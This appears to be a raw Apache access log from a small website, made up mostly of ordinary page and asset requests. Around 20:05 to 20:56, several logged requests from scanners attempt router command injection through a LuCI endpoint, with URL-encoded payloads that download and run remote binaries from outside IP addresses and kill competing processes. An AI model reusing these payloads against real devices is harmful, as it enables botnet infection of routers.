106.102.11.87 - - [27/Jun/2024:19:40:13 +0000] "GET /static/media/user1.fa046da15e89a4780c33.webp HTTP/1.1" 200 34369 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.87 - - [27/Jun/2024:19:40:13 +0000] "GET /favicon.ico HTTP/1.1" 200 269374 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
211.36.140.59 - - [27/Jun/2024:19:40:12 +0000] "GET /static/js/main.a321ef8f.js.map HTTP/1.1" 200 58129177 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:19:41:47 +0000] "GET / HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:19:41:47 +0000] "GET /static/css/main.b87daa8b.css HTTP/1.1" 200 366783 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:19:41:48 +0000] "GET /static/css/main.b87daa8b.css.map HTTP/1.1" 200 627897 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:19:41:47 +0000] "GET /static/js/main.a321ef8f.js HTTP/1.1" 200 38576035 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:19:42:03 +0000] "GET /static/media/user1.fa046da15e89a4780c33.webp HTTP/1.1" 200 34369 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.87 - - [27/Jun/2024:19:42:03 +0000] "GET /static/media/smile3.6afb782045251fc93c24.webp HTTP/1.1" 200 5092 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
211.36.140.59 - - [27/Jun/2024:19:42:03 +0000] "GET /static/media/money4.bab943b0cc9204eca042.webp HTTP/1.1" 200 25193 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.87 - - [27/Jun/2024:19:42:03 +0000] "GET /static/media/logo3.b1396c753a537eb57950.webp HTTP/1.1" 200 49654 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.87 - - [27/Jun/2024:19:42:03 +0000] "GET /static/media/logo2.67bbeba334a6dba22186.webp HTTP/1.1" 200 259014 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.87 - - [27/Jun/2024:19:42:05 +0000] "GET /static/media/exercise1.0fbc1a440efd979a68eb.webp HTTP/1.1" 200 7554 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
211.36.140.59 - - [27/Jun/2024:19:42:05 +0000] "GET /static/media/food1.bc88ff497f3bb08cf0a7.webp HTTP/1.1" 200 21818 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.87 - - [27/Jun/2024:19:42:04 +0000] "GET /favicon.ico HTTP/1.1" 200 269374 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.87 - - [27/Jun/2024:19:42:06 +0000] "GET /static/media/calendar1.89c348a3ad43be2a45b9.webp HTTP/1.1" 200 12120 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.87 - - [27/Jun/2024:19:42:06 +0000] "GET /static/media/money1.916f5b63580b041e485a.webp HTTP/1.1" 200 13072 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
211.36.140.59 - - [27/Jun/2024:19:42:06 +0000] "GET /static/media/sleep1.d40c2a1bc215a195d75e.webp HTTP/1.1" 200 13994 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.87 - - [27/Jun/2024:19:42:02 +0000] "GET /static/js/main.a321ef8f.js.map HTTP/1.1" 200 58129177 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
::1 - - [27/Jun/2024:19:42:27 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips (internal dummy connection)"
211.36.140.117 - - [27/Jun/2024:19:44:52 +0000] "GET / HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36"
211.36.140.117 - - [27/Jun/2024:19:44:52 +0000] "GET /static/css/main.b87daa8b.css HTTP/1.1" 200 366783 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36"
106.102.11.112 - - [27/Jun/2024:19:44:53 +0000] "GET /static/js/main.a321ef8f.js HTTP/1.1" 200 38576035 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36"
106.102.11.112 - - [27/Jun/2024:19:45:15 +0000] "GET /static/js/main.a321ef8f.js HTTP/1.1" 206 1 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36"
106.102.11.112 - - [27/Jun/2024:19:45:16 +0000] "GET /static/js/main.a321ef8f.js HTTP/1.1" 206 5005219 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36"
106.102.11.112 - - [27/Jun/2024:19:45:35 +0000] "GET /static/media/sleep1.d40c2a1bc215a195d75e.webp HTTP/1.1" 200 13994 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36"
106.102.11.112 - - [27/Jun/2024:19:45:35 +0000] "GET /static/media/calendar1.89c348a3ad43be2a45b9.webp HTTP/1.1" 200 12120 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36"
106.102.11.112 - - [27/Jun/2024:19:45:35 +0000] "GET /static/media/user1.fa046da15e89a4780c33.webp HTTP/1.1" 200 34369 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36"
211.36.140.117 - - [27/Jun/2024:19:45:35 +0000] "GET /static/media/money1.916f5b63580b041e485a.webp HTTP/1.1" 200 13072 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36"
106.102.11.112 - - [27/Jun/2024:19:45:35 +0000] "GET /static/media/logo3.b1396c753a537eb57950.webp HTTP/1.1" 200 49654 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36"
106.102.11.112 - - [27/Jun/2024:19:45:35 +0000] "GET /static/media/smile3.6afb782045251fc93c24.webp HTTP/1.1" 200 5092 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36"
106.102.11.112 - - [27/Jun/2024:19:45:35 +0000] "GET /static/media/money4.bab943b0cc9204eca042.webp HTTP/1.1" 200 25193 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36"
211.36.140.117 - - [27/Jun/2024:19:45:35 +0000] "GET /static/media/exercise1.0fbc1a440efd979a68eb.webp HTTP/1.1" 200 7554 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36"
106.102.11.112 - - [27/Jun/2024:19:45:35 +0000] "GET /static/media/food1.bc88ff497f3bb08cf0a7.webp HTTP/1.1" 200 21818 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36"
106.102.11.112 - - [27/Jun/2024:19:45:35 +0000] "GET /static/media/logo2.67bbeba334a6dba22186.webp HTTP/1.1" 200 259014 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36"
::1 - - [27/Jun/2024:19:45:43 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips (internal dummy connection)"
45.79.128.205 - - [27/Jun/2024:19:57:38 +0000] "\x16\x03\x01" 400 226 "-" "-"
205.210.31.11 - - [27/Jun/2024:20:01:11 +0000] "\x16\x03\x01" 400 226 "-" "-"
205.210.31.11 - - [27/Jun/2024:20:01:11 +0000] "\x16\x03\x01" 400 226 "-" "-"
141.98.83.197 - - [27/Jun/2024:20:05:39 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.1" 404 224 "-" "Go-http-client/1.1"
141.98.83.197 - - [27/Jun/2024:20:05:39 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F45.148.10.78%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60) HTTP/1.1" 404 224 "-" "Go-http-client/1.1"
185.191.127.212 - - [27/Jun/2024:20:18:20 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 404 224 "-" "Go-http-client/1.1"
5.8.11.202 - - [27/Jun/2024:20:33:39 +0000] "GET / HTTP/1.0" 301 234 "-" "Mozilla/5.0 (compatible; Konqueror/3.3; Linux 2.6.8-gentoo-r3; X11;"
80.82.77.202 - - [27/Jun/2024:20:47:02 +0000] "GET / HTTP/1.0" 301 234 "-" "Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Mobile Safari/537.36"
83.97.73.245 - - [27/Jun/2024:20:55:37 +0000] "GET /actuator/gateway/routes HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.191.127.212 - - [27/Jun/2024:20:56:30 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 404 224 "-" "Go-http-client/1.1"
4.151.226.185 - - [27/Jun/2024:21:00:57 +0000] "GET /portal/redlion HTTP/1.1" 200 748 "-" "Mozilla/5.0 zgrab/0.x"
211.36.140.59 - - [27/Jun/2024:21:04:54 +0000] "GET / HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.36.140.59 - - [27/Jun/2024:21:04:54 +0000] "GET /static/css/main.b87daa8b.css HTTP/1.1" 200 366783 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.36.140.59 - - [27/Jun/2024:21:04:55 +0000] "GET /static/css/main.b87daa8b.css.map HTTP/1.1" 200 627897 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.104 - - [27/Jun/2024:21:04:55 +0000] "GET /static/js/main.a321ef8f.js HTTP/1.1" 200 38576035 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.104 - - [27/Jun/2024:21:05:10 +0000] "GET /static/media/smile3.6afb782045251fc93c24.webp HTTP/1.1" 200 5092 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.104 - - [27/Jun/2024:21:05:10 +0000] "GET /static/media/logo3.b1396c753a537eb57950.webp HTTP/1.1" 200 49654 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.104 - - [27/Jun/2024:21:05:11 +0000] "GET /static/media/user1.fa046da15e89a4780c33.webp HTTP/1.1" 200 34369 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.104 - - [27/Jun/2024:21:05:11 +0000] "GET /static/media/money4.bab943b0cc9204eca042.webp HTTP/1.1" 200 25193 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.104 - - [27/Jun/2024:21:05:10 +0000] "GET /static/media/logo2.67bbeba334a6dba22186.webp HTTP/1.1" 200 259014 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.104 - - [27/Jun/2024:21:05:11 +0000] "GET /static/media/exercise1.0fbc1a440efd979a68eb.webp HTTP/1.1" 200 7554 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.104 - - [27/Jun/2024:21:05:12 +0000] "GET /static/media/food1.bc88ff497f3bb08cf0a7.webp HTTP/1.1" 200 21818 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.104 - - [27/Jun/2024:21:05:12 +0000] "GET /static/media/calendar1.89c348a3ad43be2a45b9.webp HTTP/1.1" 200 12120 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.104 - - [27/Jun/2024:21:05:12 +0000] "GET /static/media/money1.916f5b63580b041e485a.webp HTTP/1.1" 200 13072 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.104 - - [27/Jun/2024:21:05:12 +0000] "GET /static/media/sleep1.d40c2a1bc215a195d75e.webp HTTP/1.1" 200 13994 "https://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.104 - - [27/Jun/2024:21:05:13 +0000] "GET /favicon.ico HTTP/1.1" 200 269374 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.104 - - [27/Jun/2024:21:05:10 +0000] "GET /static/js/main.a321ef8f.js.map HTTP/1.1" 200 58129177 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
::1 - - [27/Jun/2024:21:05:28 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips (internal dummy connection)"
106.102.11.104 - - [27/Jun/2024:21:08:07 +0000] "GET /user/login HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.104 - - [27/Jun/2024:21:08:07 +0000] "GET /static/css/main.b87daa8b.css HTTP/1.1" 200 366783 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.104 - - [27/Jun/2024:21:08:08 +0000] "GET /static/css/main.b87daa8b.css.map HTTP/1.1" 200 627897 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.104 - - [27/Jun/2024:21:08:08 +0000] "GET /static/js/main.2db65807.js HTTP/1.1" 200 38575970 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.104 - - [27/Jun/2024:21:08:21 +0000] "GET /static/media/user1.fa046da15e89a4780c33.webp HTTP/1.1" 200 34369 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.104 - - [27/Jun/2024:21:08:21 +0000] "GET /favicon.ico HTTP/1.1" 200 269374 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.104 - - [27/Jun/2024:21:08:20 +0000] "GET /static/js/main.2db65807.js.map HTTP/1.1" 200 58129168 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.104 - - [27/Jun/2024:21:13:59 +0000] "GET /user/login HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.104 - - [27/Jun/2024:21:13:59 +0000] "GET /static/css/main.b87daa8b.css HTTP/1.1" 200 366783 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.104 - - [27/Jun/2024:21:14:01 +0000] "GET /static/css/main.b87daa8b.css.map HTTP/1.1" 200 627897 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.36.140.59 - - [27/Jun/2024:21:14:00 +0000] "GET /static/js/main.2dc7e812.js HTTP/1.1" 200 38575987 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.104 - - [27/Jun/2024:21:14:20 +0000] "GET /static/media/user1.fa046da15e89a4780c33.webp HTTP/1.1" 200 34369 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.104 - - [27/Jun/2024:21:14:21 +0000] "GET /favicon.ico HTTP/1.1" 200 269374 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
211.36.140.59 - - [27/Jun/2024:21:14:19 +0000] "GET /static/js/main.2dc7e812.js.map HTTP/1.1" 200 58129177 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
::1 - - [27/Jun/2024:21:14:47 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips (internal dummy connection)"
85.158.2.93 - - [27/Jun/2024:21:21:10 +0000] "GET /favicon.ico HTTP/1.1" 200 269374 "-" "Mozilla/5.0"
106.102.11.104 - - [27/Jun/2024:21:24:26 +0000] "GET /user/login HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.104 - - [27/Jun/2024:21:24:27 +0000] "GET /static/css/main.b87daa8b.css HTTP/1.1" 200 366783 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.104 - - [27/Jun/2024:21:24:28 +0000] "GET /static/css/main.b87daa8b.css.map HTTP/1.1" 200 627897 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.104 - - [27/Jun/2024:21:24:27 +0000] "GET /static/js/main.2dc7e812.js HTTP/1.1" 200 38575987 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.104 - - [27/Jun/2024:21:24:39 +0000] "GET /static/media/user1.fa046da15e89a4780c33.webp HTTP/1.1" 200 34369 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.104 - - [27/Jun/2024:21:24:40 +0000] "GET /favicon.ico HTTP/1.1" 200 269374 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
211.36.140.59 - - [27/Jun/2024:21:24:40 +0000] "GET /manifest.json HTTP/1.1" 200 177 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.104 - - [27/Jun/2024:21:24:38 +0000] "GET /static/js/main.2dc7e812.js.map HTTP/1.1" 200 58129177 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
::1 - - [27/Jun/2024:21:24:45 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips (internal dummy connection)"
211.36.140.59 - - [27/Jun/2024:21:30:19 +0000] "OPTIONS /user/login HTTP/1.1" 200 - "http://localhost:3000/" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
185.224.128.43 - - [27/Jun/2024:21:33:49 +0000] "GET / HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
106.102.11.3 - - [27/Jun/2024:21:34:16 +0000] "OPTIONS /user/login HTTP/1.1" 200 - "http://localhost:3000/" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.104 - - [27/Jun/2024:21:39:01 +0000] "GET /user/login HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.104 - - [27/Jun/2024:21:39:02 +0000] "GET /static/css/main.b87daa8b.css HTTP/1.1" 200 366783 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.104 - - [27/Jun/2024:21:39:03 +0000] "GET /static/css/main.b87daa8b.css.map HTTP/1.1" 200 627897 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.104 - - [27/Jun/2024:21:39:02 +0000] "GET /static/js/main.2dc7e812.js HTTP/1.1" 200 38575987 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.104 - - [27/Jun/2024:21:39:21 +0000] "GET /static/media/user1.fa046da15e89a4780c33.webp HTTP/1.1" 200 34369 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.104 - - [27/Jun/2024:21:39:20 +0000] "GET /favicon.ico HTTP/1.1" 200 269374 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
